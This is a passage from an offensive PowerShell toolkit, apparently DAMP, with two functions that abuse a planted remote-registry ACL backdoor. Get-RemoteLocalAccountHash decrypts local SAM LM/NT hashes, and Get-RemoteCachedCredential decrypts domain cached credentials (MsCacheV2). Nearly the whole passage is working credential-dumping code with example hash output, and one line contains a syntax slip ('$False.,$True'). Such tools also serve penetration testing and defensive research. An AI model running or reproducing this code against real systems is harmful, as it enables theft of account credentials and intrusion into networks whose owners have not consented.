        $MachineAccountHash = ([System.BitConverter]::ToString($Out) -replace '-','').ToLower()

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ComputerName' $Computer
        $Out | Add-Member Noteproperty 'MachineAccountHash' $MachineAccountHash
        $Out
    }
}


function Get-RemoteLocalAccountHash {
<#
.SYNOPSIS

Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve
the local SAM account hashes for the specified machine.

This is essentially a re-coded remote version of Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K)'s
PowerDump.ps1 script (https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/data/exploits/powershell/powerdump.ps1)

Author: Matt Nelson (@enigma0x3), Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

Opens up the remote registry instance specified by -ComputerName, retrieves the
SysKey/bootkey with Get-RemoteBootKey, uses the BootKey to calculate the HBootKey,
and uses the HBootKey to decrypt local user account hashes.

.PARAMETER ComputerName

Specifies the hostname to retrieve the local machine account hash for.
Defaults to localhost.

.EXAMPLE

Get-RemoteLocalAccountHash -ComputerName client.external.local -Verbose

VERBOSE: Bootkey/SysKey : 0AF496ADE2F34BB46BF052392F97F310
VERBOSE: HBootKey : F9C4F5E09770D65FD8987ED5D36BC800CE7820C228B04F1E6AF0D929CA7D168E

ComputerName : client.external.local
UserName     : Administrator
UserRID      : 500
UserLMHash   : aad3b435b51404eeaad3b435b51404ee
UserNTLMHash : 31d6cfe0d16ae931b73c59d7e0c089c0

ComputerName : client.external.local
UserName     : Guest
UserRID      : 501
UserLMHash   : aad3b435b51404eeaad3b435b51404ee
UserNTLMHash : 31d6cfe0d16ae931b73c59d7e0c089c0

ComputerName : client.external.local
UserName     : admin
UserRID      : 1000
UserLMHash   : aad3b435b51404eeaad3b435b51404ee
UserNTLMHash : 2b576acbe6bcfda7294d6bd18041b8fe

.LINK

http://moyix.blogspot.com/2008/02/syskey-and-sam.html
https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/data/exploits/powershell/powerdump.ps1
https://www.win.tue.nl/~aeb/linux/hh/Hackers_Hut_Windows_passwords.pdf
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    # more details on the process: http://moyix.blogspot.com/2008/02/syskey-and-sam.html
    # another good reference: https://www.win.tue.nl/~aeb/linux/hh/Hackers_Hut_Windows_passwords.pdf
    ForEach($Computer in $ComputerName) {
        # connect to the registry on the remote system
        [IntPtr]$nKey = [System.IntPtr]::Zero
        $Result = $Advapi32::RegConnectRegistry("\\$($Computer)", 0x80000002, [ref]$nKey)
        if($Result -ne 0) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "[$Computer] Error connecting to remote registry: $(([ComponentModel.Win32Exception] $Result).Message)"
            return
        }

        # grab the bootkey from the remote registry
        $Bootkey = Get-RemoteBootKey -hKey $nKey

        # calculate the HBootKey value
        # adapted from from https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/data/exploits/powershell/powerdump.ps1
        #   credit to Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K)
        $AQwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
        $ANum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")

        $RemoteReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey("LocalMachine", $Computer)
        $RemoteKey = $RemoteReg.OpenSubKey("SAM\SAM\Domains\Account")
        [Byte[]]$F = $RemoteKey.GetValue("F")
        $RC4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $AQwerty + $Bootkey + $ANum)

        $HBootKey = ConvertTo-Rc4ByteStream -InputObject $F[0x80..0x9F] -Key $RC4key

        Write-Verbose ("Bootkey/SysKey : " + ([System.BitConverter]::ToString($Bootkey) -replace '-',''))
        Write-Verbose ("HBootKey : " + ([System.BitConverter]::ToString($HBootKey) -replace '-',''))

        # enumerate all the local user account subkey values available
        $RemoteUserKeys = $RemoteReg.OpenSubKey('SAM\SAM\Domains\Account\Users')
        $UserKeys = $RemoteUserKeys.GetSubKeyNames() | ? {$_ -Match '^[0-9A-Fa-f]{8}$'}

        # for each local user account subkey extract out the encrypted password bytes
        # and decrypt them using Decrypt-Hash to get the resulting LM/NT hash
        ForEach($UserKey in $UserKeys) {
            $UserRID = [Convert]::ToInt32($UserKey, 16)
            $RemoteUserKey = $RemoteReg.OpenSubKey("SAM\SAM\Domains\Account\Users\$UserKey")
            [Byte[]]$V = $RemoteUserKey.GetValue('V')

            $Offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC
            $Len = [BitConverter]::ToInt32($V[0x10..0x13],0)
            $UserName = [Text.Encoding]::Unicode.GetString($V, $Offset, $Len)
            $UserHashOffset = [BitConverter]::ToUInt32($V[0x9c..0x9f],0) + 0xCC

            [Byte[]]$EncLMHash = $Null
            [Byte[]]$EncNTHash = $Null
            if (($UserHashOffset + 0x28) -lt $V.Length) {
                $LMHashOffset = $UserHashOffset + 4
                $NTHashOffset = $UserHashOffset + 8 + 0x10
                $EncLMHash = $V[$($LMHashOffset)..$($LMHashOffset+0x0f)]
                $EncNTHash = $V[$($NTHashOffset)..$($NTHashOffset+0x0f)]
            }
            elseif (($UserHashOffset + 0x14) -lt $V.Length) {
                $NTHashOffset = $UserHashOffset + 8
                $EncNTHash = $V[$($NTHashOffset)..$($NTHashOffset+0x0f)]
            }

            # decrypt the raw encrypted bytes using Decrypt-Hash
            $NTHashRaw = Decrypt-Hash -RID $UserRID -HBootKey $HBootKey -EncHash $EncNTHash -HashType 'NT'
            $LMHashRaw = Decrypt-Hash -RID $UserRID -HBootKey $HBootKey -EncHash $EncLMHash -HashType 'LM'
            $NTHash = [BitConverter]::ToString($NTHashRaw).Replace('-', '').ToLower()
            $LMHash = [BitConverter]::ToString($LMHashRaw).Replace('-', '').ToLower()

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ComputerName' $Computer
            $Out | Add-Member Noteproperty 'UserName' $UserName
            $Out | Add-Member Noteproperty 'UserRID' $UserRID
            $Out | Add-Member Noteproperty 'UserLMHash' $LMHash
            $Out | Add-Member Noteproperty 'UserNTLMHash' $NTHash
            $Out
        }
    }
}


function Get-RemoteCachedCredential {
<#
.SYNOPSIS

Abuses the ACL backdoor set by Add-RemoteRegBackdoor to retrieve domain cached
credentials from a remote machine.

Author: Matt Nelson (@enigma0x3), Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)
License: BSD 3-Clause  
Required Dependencies: PSReflect, Get-RemoteBootKey, Get-LsaSha256Hash, Decrypt-Bytes

.DESCRIPTION

Opens up the remote registry instance specified by -ComputerName, retrieves the
SysKey/bootkey with Get-RemoteBootKey, uses the BootKey to decrypt the LSA key,
and finally uses the LSA key to decrypt the cached credentials of the remote system.

.PARAMETER ComputerName

Specifies the hostname to retrieve the local cached credentials for.
Defaults to localhost.

.EXAMPLE

Get-RemoteCachedCredential -Computername client.external.local -Verbose

Retrieves the domain cached credentials (MsCacheV2) from client.external.local.

.LINK

http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html
#>
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    # good reference on this process: http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html
    ForEach($Computer in $ComputerName) {
        # connect to the registry on the remote system
        [IntPtr]$nKey = [System.IntPtr]::Zero
        # 0x80000002 == HKEY_LOCAL_MACHINE
        $Result = $Advapi32::RegConnectRegistry("\\$($Computer)", 0x80000002, [ref]$nKey)
        if($Result -ne 0) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "[$Computer] Error connecting to remote registry: $(([ComponentModel.Win32Exception] $Result).Message)"
            return
        }

        $RemoteReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $Computer)

        # extract the bootkey from the remote registry
        $BootKey = Get-RemoteBootKey -hKey $nKey

        # extract the LSA key from the remote registry using the bootkey
        $LSAKey = Get-RemoteLSAKey -hKey $nKey -BootKey $BootKey

        # extract the NL$KM key from the remote registry using the bootkey
        $NLKMKey = Get-RemoteNLKMKey -hKey $nKey -LSAKey $LSAKey

        Write-Verbose ("Bootkey/SysKey : " + ([System.BitConverter]::ToString($BootKey) -replace '-',''))
        Write-Verbose ("LSA Key        : " + ([System.BitConverter]::ToString($LSAKey) -replace '-',''))
        Write-Verbose ("NL`$KM Key     : " + ([System.BitConverter]::ToString($NLKMKey) -replace '-',' '))

        # enumerate all the cached entry values available
        $RemoteCacheKeys = $RemoteReg.OpenSubKey('Security\Cache')
        $CacheKeys = $RemoteCacheKeys.GetValueNames() | ? {$_ -Match '^NL\$[0-9]+$'}
        
        # Check value of NL$IterationCount, if set to 0, then output decrypted hash as MsCache

        # for each local cached entries 
        # reference for the structure: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/cachedump.rb#L218-L250
        ForEach($CacheKey in $CacheKeys) {
            $RawData = $RemoteCacheKeys.GetValue($CacheKey)
            $EncryptedData = $RawData

            $UserNameLength     = [BitConverter]::ToInt16($EncryptedData[0..1], 0)
            $DomainNameLength   = [BitConverter]::ToInt16($EncryptedData[2..3], 0)
            $UserRID            = [BitConverter]::ToInt32($EncryptedData[16..19], 0)
            $FullDomainLength   = [BitConverter]::ToInt16($EncryptedData[60..61], 0)
            # $THi                = [BitConverter]::ToInt32($EncryptedData[32..35], 0)
            # $TLow               = [BitConverter]::ToInt32($EncryptedData[36..39], 0)
            $CH                 = $EncryptedData[64..79]
            
            if ($UserNameLength -ne 0) {
                $Temp = $EncryptedData[96..$($EncryptedData.Length)]
                if ( ($EncryptedData.Length % 16) -ne 0 ) {
                    [Byte[]]$CipherText = @(0) * ($EncryptedData.Length + (16 - ($EncryptedData.Length % 16)))
                }
                else {
                    [Byte[]]$CipherText = @(0) * ($EncryptedData.Length)
                }
                [Array]::Copy($Temp, $CipherText, $Temp.Length)

                $CachePlaintext = Decrypt-Bytes -Key $NLKMKey[0..15] -CipherText $CipherText -IV $CH

                # first 16 bytes of the decrypted result are the username
                $MsCacheV2 = ([System.BitConverter]::ToString($CachePlaintext[0..15]) -replace '-','').ToLower()

                # the rest of the bytes are the hash and metadata
                $Plaintext = $CachePlaintext[72..$($CachePlaintext.Length)]

                # grab utf-16le encoding
                $Encoding = New-Object System.Text.UnicodeEncoding($False, $False.,$True)

                # the next chunk is the variable-length username
                $User = $Encoding.GetString($Plaintext[0..($UserNameLength - 1)])
                
                # then we have the domain shortname
                $Domain = $Encoding.GetString($Plaintext[($UserNameLength)..($UserNameLength + $DomainNameLength - 1)])
                if ([byte][char]$Domain[0] -eq 0) {
                    $Domain = $Encoding.GetString($Plaintext[($UserNameLength + 2)..($UserNameLength + $DomainNameLength + 1)])

                    # and finally the domain fullname
                    $FullDomain = $Encoding.GetString($Plaintext[($UserNameLength + $DomainNameLength + 2)..($FullDomainLength + $UserNameLength + $DomainNameLength + 1)])
                }
                else {
                    # and finally the domain fullname
                    $FullDomain = $Encoding.GetString($Plaintext[($UserNameLength + $DomainNameLength )..($FullDomainLength + $UserNameLength + $DomainNameLength - 1)])
                }

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ComputerName' $Computer
                $Out | Add-Member Noteproperty 'UserRID' $UserRID
                $Out | Add-Member Noteproperty 'User' "$Domain\$User"
                $Out | Add-Member Noteproperty 'Domain' $FullDomain
                $Out | Add-Member Noteproperty 'MsCacheV2' $MsCacheV2
                $Out
            }
        }
        $RemoteReg.Close()
    }
}
